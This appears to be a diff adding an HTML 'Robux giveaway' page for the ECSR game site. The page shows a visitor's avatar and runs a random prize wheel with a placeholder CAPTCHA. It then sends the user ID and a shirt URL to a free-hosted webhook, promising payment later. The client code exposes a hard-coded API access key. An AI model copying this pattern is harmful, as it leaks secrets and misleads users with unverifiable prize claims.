@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ECSR Robux Giveaway</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 20px; }
+    #avatar, #profileImg, #wheel, #reward, #shirtSection, #captchaSection { display: none; margin-top: 20px; }
+    #spinBtn { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h1>ECSR Robux Giveaway</h1>
+  <input type="text" id="userId" placeholder="Enter ECSR User ID">
+  <button onclick="verifyUser()">Check</button>
+
+  <div id="avatar"></div>
+  <div id="profileImg"></div>
+  <div id="confirm">
+    <p>Is this you?</p>
+    <button onclick="proceed()">Yes</button>
+    <button onclick="reset()">No</button>
+  </div>
+
+  <div id="wheel">
+    <p>Spin the wheel!</p>
+    <button id="spinBtn" onclick="spinWheel()">🎡 SPIN</button>
+  </div>
+
+  <div id="reward"></div>
+
+  <div id="captchaSection">
+    <p>Complete the CAPTCHA below:</p>
+    <!-- Replace with actual Turnstile or FunCaptcha -->
+    <button onclick="captchaPassed()">✅ I'm not a robot</button>
+  </div>
+
+  <div id="shirtSection">
+    <p>Enter your shirt URL to claim your Robux:</p>
+    <input type="text" id="shirtUrl" placeholder="https://ecsr.io/shirt/...">
+    <button onclick="submitClaim()">Submit</button>
+  </div>
+
+  <script>
+    let userId = '';
+    let rewardAmount = 0;
+
+    function verifyUser() {
+      userId = document.getElementById('userId').value;
+      if (!userId) return alert("Enter a valid user ID");
+
+      const avatarUrl = `https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`;
+      fetch(avatarUrl)
+        .then(res => res.json())
+        .then(data => {
+          const imageUrl = "https://ecsr.io" + data.data[0].imageUrl;
+          document.getElementById('avatar').innerHTML = `<img src="${imageUrl}" width="100">`;
+          document.getElementById('avatar').style.display = 'block';
+
+          const profileUrl = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;
+          document.getElementById('profileImg').innerHTML = `<img src="${profileUrl}" width="300">`;
+          document.getElementById('profileImg').style.display = 'block';
+
+          document.getElementById('confirm').style.display = 'block';
+        });
+    }
+
+    function proceed() {
+      document.getElementById('wheel').style.display = 'block';
+      document.getElementById('confirm').style.display = 'none';
+    }
+
+    function reset() {
+      window.location.reload();
+    }
+
+    function spinWheel() {
+      rewardAmount = Math.floor(Math.random() * 10) * 10 + 10;
+      document.getElementById('reward').innerText = `🎉 You won ${rewardAmount} Robux!`;
+      document.getElementById('reward').style.display = 'block';
+      document.getElementById('captchaSection').style.display = 'block';
+    }
+
+    function captchaPassed() {
+      document.getElementById('captchaSection').style.display = 'none';
+      document.getElementById('shirtSection').style.display = 'block';
+    }
+
+    function submitClaim() {
+      const shirtUrl = document.getElementById('shirtUrl').value;
+      if (!shirtUrl.startsWith("http")) return alert("Enter a valid shirt URL");
+
+      fetch('http://just-testingg.infinityfreeapp.com/webhook.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userId: userId,
+          reward: rewardAmount,
+          shirtUrl: shirtUrl
+        })
+      }).then(() => {
+        alert("Claim submitted! We will verify and pay soon.");
+        window.location.reload();
+      });
+    }
+  </script>
+</body>
+</html>
